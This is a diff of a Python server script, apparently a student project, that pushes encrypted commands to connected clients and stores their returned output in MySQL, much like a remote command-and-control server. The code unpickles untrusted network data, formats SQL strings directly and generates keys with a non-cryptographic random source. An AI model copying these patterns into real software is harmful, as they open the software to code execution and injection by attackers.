@@ -10,6 +10,7 @@ import mysql.connector as mysql
 #||||||||||||||||||||||||||||||SERVER||||||||||||||||||||||||||
 
 #TODO
+#   1.  Change the result dict to --> who : [{command : result}, {command : result}]
 
 
 HVA = '145.109.151.121'
@@ -38,13 +39,13 @@ def decryptAES(ciphertext, key, key2):
     message = obj2.decrypt(ciphertext)
     return message
 
-
+#   --> Generates a key based on a given keySize.
 def generateKeys(keySize):
     key = []
     for i in range(0, 2):
         x = ""
         for j in range(keySize):
-            x += chr(int(random.randrange(65, 90)))
+            x += chr(int(random.randrange(65, 90))) #Capitals only for now
         key.append(x)
     return key
 
@@ -58,7 +59,7 @@ def connHandler(socket, x):
             who = pickle.loads(conn.recv(2048))
             socketDict.update({who : [conn, key]}) #store key
             conn.send(pickle.dumps(key)) #send key
-            resultDict.update({who : []})
+            resultDict.update({who : [{}]}) #For every new conn, initialize it with who : [results]
         except Exception as e:
             print(e)
 
@@ -67,7 +68,10 @@ def sendCommands():
     for key in socketDict.keys():
         for command in commandList:
             try:
-                socketDict[key][0].send(pickle.dumps(encryptAES(command, socketDict[key][1][0], socketDict[key][1][1])))
+                command = encryptAES(command, socketDict[key][1][0], socketDict[key][1][1])
+                command = pickle.dumps(command)
+                socketDict[key][0].send(command)
+                #socketDict[key][0].send(pickle.dumps(encryptAES(command, socketDict[key][1][0], socketDict[key][1][1]))) #ONELINER :-)
                 receive(key)
             except Exception as e:
                 print(e)
@@ -76,11 +80,12 @@ def sendCommands():
     print("connections: ",socketDict)
  
 #   --> Receives something from a socket, key is the key in socketDict.
-#       socketDict[key][0] is a socket, 1 and 2 are keys
+#       socketDict[key][0] is a socket, [1][0] and [1][1] are keys
 def receive(key):
     try:
         x = pickle.loads(socketDict[key][0].recv(2048)) #Deserialize
         x = decryptAES(x, socketDict[key][1][0], socketDict[key][1][1]) #Decrypt
+        # |||||| SHOULD STORE RESULTDICT[KEY][WHO, {COMMAND : OUTPUT}] ||||||||||
         resultDict[key].append(x) #store the result for said connection in resultDict
     except Exception as e:
         print(e)
@@ -95,15 +100,16 @@ def connDatabase(resultDict):
                                     database = "TESTMAU"
         )
 
-
-    except Exception as e:
-
         if db.is_connected():
             db_version = db.get_server_info()
             print("MySQL Database Connected: " + db_version)
             cursor = db.cursor(buffered=True)
             cursor.execute("INSERT INTO Data (Time) VALUES ('{}')".format(resultDict)) 
             db.commit()
+
+    except Exception as e:
+        print(e)
+
 
 def main():
 
